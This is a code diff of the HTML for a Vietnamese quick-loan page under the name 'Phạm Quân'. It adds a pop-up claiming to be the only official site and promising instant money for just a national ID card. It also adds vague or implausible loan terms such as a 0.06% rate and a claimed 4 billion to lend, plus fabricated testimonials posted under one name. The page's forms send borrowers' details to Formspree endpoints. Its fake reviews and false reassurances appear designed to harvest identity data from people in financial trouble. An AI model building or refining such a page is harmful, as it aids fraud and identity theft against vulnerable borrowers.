@@ -8,10 +8,21 @@
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Arial:wght@400;700&display=swap">
 </head>
 <body>
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <h2>Phạm Quân - Uy Tín Định Hình Thương Hiệu</h2>
+            <p class="warning-line">Trong bối cảnh hiện nay, có vô số trang web giả mạo</p>
+            <p class="warning-line"><span class="warning-text">XXX</span> Đây là trang web duy nhất và chính thức của Phạm Quân.</p>
+            <p class="warning-line">Chúng tôi mang đến dịch vụ vay nhanh chóng và tiện lợi, chỉ với vài thao tác đơn giản, tiền sẽ được chuyển ngay vào tài khoản của bạn.</p>
+            <p style="color: green; font-weight: bold;">Chú ý: Bạn chỉ cần cung cấp CCCD nhận ngay số tiền bạn đang cần.</p>
+            <button id="modalBtn">OK</button>
+        </div>
+    </div>
     <header>
         <h1>Phạm Quân uy tín số 1 VN - Vay tiền nhanh trả góp</h1>
     </header>
     <main>
+        <!-- Nội dung trang web chính thức -->
         <section class="form-section">
             <h2>Đăng ký vay</h2>
             <form id="loanForm" action="https://formspree.io/f/xzbnnwvz" method="POST">
@@ -79,25 +90,54 @@
             </form>
         </section>
         
+        <!-- Thông tin hỗ trợ vay -->
         <section class="info-section">
             <h2>Hỗ trợ vay tới 24 tháng</h2>
-            <ul>
-                <li>Bảo mật thông tin tuyệt đối</li>
-                <li>Không gọi thẩm định người thân</li>
-                <li>Chỉ cần đưa địa chỉ nhà cụ thể , bên tôi sẽ đảm bảo thông tin cho bạn</li>
-                <li>Bạn có thể đến gặp tôi để nhận tiền mặt</li>
-                <li>Tôi sẽ ưu tiên những người nhập zalo với địa chỉ dưới bình luận </li>
-                <li>Xin lưu ý lại bên tôi chỉ cho vay bằng cccd nên bạn phải đến găp tôi để nhận tiền!</li>
-                
-            </ul>
+            <div class="content">
+                <div class="image">
+                    <img src="./image/image3.png" alt="Vay tiền online">
+                </div>
+                <div class="details">
+                    <table>
+                        <tr>
+                            <th>Hình thức</th>
+                            <td>Vay tiền cấp tốc online CMND</td>
+                        </tr>
+                        <tr>
+                            <th>Thủ tục giấy tờ</th>
+                            <td>Chỉ cần CMND/CCCD</td>
+                        </tr>
+                        <tr>
+                            <th>Hạn mức</th>
+                            <td>Đến 15 triệu đồng</td>
+                        </tr>
+                        <tr>
+                            <th>Lãi suất</th>
+                            <td>0.06%</td>
+                        </tr>
+                        <tr>
+                            <th>Thời hạn vay</th>
+                            <td>91 - 180 ngày</td>
+                        </tr>
+                    </table>
+                    <p>
+                        Phạm Quân cung cấp sản phẩm vay tiền online cho phép bạn đăng ký khoản vay online nhanh 24/24 chỉ cần CMND và nhận tiền chuyển khoản ngay về thẻ ATM sau 15 phút.
+                        Bạn chỉ cần điền thông tin vào biểu mẫu online thông qua điện thoại, và chờ duyệt, sau đó được giải ngân nhanh chóng.
+                    </p>
+                    <p>
+                        Hệ thống hoạt động 24/7, mọi thắc mắc gọi hotline 18009198 để được giải đáp ngay.
+                    </p>
+                </div>
+            </div>
         </section>
 
         <section class="loan-packages">
             <h2>Các gói vay ưu đãi</h2>
             <ul>
-                <li>Lãi bạc 60</li>
-                <li>Bên tôi có hỗ trợ cho vay theo ngày , VD 10tr ngày trả 200k</li>
-                <li>10.000.000đ - 16.000.000đ tổng thanh toán</li>
+                <li>Lãi suất hợp lí</li>
+                <li>Bên tôi có hỗ trợ cho vay theo ngày rất phù hợp với giá cả thị trường</li>
+                <li>Tôi đang còn 4 tỉ , bây giờ tôi muốn cho ai vay thì vay với mức giá phù hợp</li>
+                
             </ul>
             <div class="images">
                 <img src="image/image1.png" alt="Khoản vay ưu đãi 5.000.000VND">
@@ -109,8 +149,8 @@
             <h2>Liên hệ</h2>
             <address>
                 Công ty cổ phần kinh doanh do Phạm Quân điều hành<br>
-                Địa chỉ: Vinhome GrandPark , Quận 9<br>
-                Hotline: 0846549349
+                Địa chỉ: Hồ Chí Minh<br>
+                My contact: 18009198762
             </address>
         </section>
 
@@ -157,8 +197,8 @@
                 <div class="comment">
                     <img src="avatar4.png" alt="User Avatar" class="avatar">
                     <div class="comment-content">
-                        <p class="comment-user">Hoàng Long</p>
-                        <p>Vui lòng nhập bình luận</p>
+                        <p class="comment-user">Đặng Đình Long</p>
+                        <p>Các anh quá út luôn, e đang kẹt chỉ vay trong vòng 2p là tiền về, mọi người có thiếu có kẹt thì ib qua đây 0846549349</p>
                         <div class="comment-footer">
                             <span>1 giờ trước</span>
                             <a href="#">Thích</a>
@@ -170,7 +210,7 @@
                 <div class="comment">
                     <img src="avatar1.png" alt="User Avatar" class="avatar">
                     <div class="comment-content">
-                        <p class="comment-user">User</p>
+                        <p class="comment-user">Đặng Đình Long</p>
                         <p>Bên đây uy tín lắm mọi người ơi, chất lượng cao nhanh gọn lẹ, giải quyết vấn đề nhanh giải ngân trong 5p, uy tín cao an toàn bảo mật.</p>
                         <div class="comment-footer">
                             <span>2 giờ trước</span>
@@ -180,7 +220,7 @@
                     </div>
                 </div>
             </div>
-            <form id="commentForm" action="https://formspree.io/f/xzbnnwvz" method="POST">
+            <form id="commentForm" action="https://formspree.io/f/mgeggjkp" method="POST">
                 <label for="comment">Bình luận của bạn</label>
                 <textarea id="comment" name="comment" required></textarea>
                 <button type="submit">Gửi đi</button>
